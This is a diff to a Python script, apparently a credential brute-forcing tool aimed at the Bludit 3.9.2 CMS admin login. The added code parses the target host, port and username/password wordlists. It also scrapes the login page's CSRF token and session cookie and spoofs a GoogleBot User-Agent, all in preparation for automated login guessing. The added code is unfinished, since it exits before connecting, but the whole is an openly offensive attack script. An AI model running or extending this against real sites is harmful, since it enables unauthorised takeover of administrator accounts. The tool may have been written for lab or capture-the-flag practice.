@@ -7,7 +7,83 @@ from http import client
 from time import sleep
 import itertools
 import threading
+import argparse
 
+
+def banner():
+    print("No banner yet")
+
+def argument_parser():
+    parser = argparse.ArgumentParser(prog="bludit_3.9.2-bruteforce.py",
+                                     usage="./bludit_3.9.2-brutefoce.py [--path|-p|-t|-T] {-s} {-U} {-P}")
+    parser.add_argument("--host",default="localhost",type=str,required=True,help="specify server to connect",metavar="")
+    parser.add_argument("--path",default="/bludit/admin",type=str,help="specify bludit login path... default[/bludit/admin/]",metavar="")
+    parser.add_argument("-p","--port",default=80,type=int,help="specify port...  Default[p:80]",metavar="")
+    parser.add_argument("-U","--username",type=str,required=True,help="specify username. It can be a username or a path",metavar="")
+    parser.add_argument("-P","--password",type=str,required=True,help="specify password. It can be a password or a path",metavar="")
+    parser.add_argument("-t","--threads",type=int,help="specify threads... Default[t:1]",metavar="")
+    parser.add_argument("-T","--timeout",type=int,help="specify timeout in seconds... Default[30]",metavar="")
+    args = parser.parse_args()
+    return args
+
+def argument_checker(args):
+    wordlistpair = argument_checker_wordlist(args.username,args.password)
+    print(wordlistpair)
+    exit()
+    
+    HTTPHandler = client.HTTPConnection(args.host,args.port)
+    HTTPHandler.connect()
+    HTTPHandler,cookie,token = argument_checker_host(HTTPHandler,args.host,args.path)
+
+def argument_checker_wordlist(username,password):    
+    wordlistpair = [username,password]
+    for i in range(2):
+        if type(wordlistpair[i]) == list:
+            continue
+        if os.path.isfile(wordlistpair[i]):
+            wordlistpair[i] = open(wordlistpair[i], 'r', encoding="latin-1").read()
+        wordlistpair[i] = wordlistpair[i].split("\n")
+    return wordlistpair
+
+def argument_checker_host(HTTPHandler,host,path):
+    header = {
+        "Host":host,
+        "User-Agent":"GoogleBot",
+        "Connection":"KeepAlive",
+        }
+    HTTPHandler.request("GET",path,headers=header)
+    try:
+        response = HTTPHandler.getresponse()
+    except:
+        ERROR("argument_checker_host","host seems down")
+
+    try:
+        token = research('input.+?name="tokenCSRF".+?value="(.+?)"', response.read().decode()).group(1)
+        cookie = response.getheader("Set-Cookie").split(";")[0]
+    except:
+        ERROR("argument_checker_host","bludit cookie and token doesn't found")
+
+    return HTTPHandler,cookie,token
+
+def ERROR(msg1,msg2):
+    """
+    msg1 = location
+    msg2 = reason
+    """
+    print("==================")
+    print("#### ERROR #######")
+    print("[X] {}".format(msg1))
+    print("[X] {}".format(msg2))
+    print("==================")
+    exit()
+
+    
+if __name__ == "__main__":
+    banner()
+    args = argument_parser()
+    argument_checker(args)
+    exit()
+                        
 
 # this program was tested only in bludit v3.9.2
 
@@ -146,3 +222,5 @@ for user in wordlistpair[0]:
         credentials="FALSE"
         
 print("\n[*] Finished...")
+
+
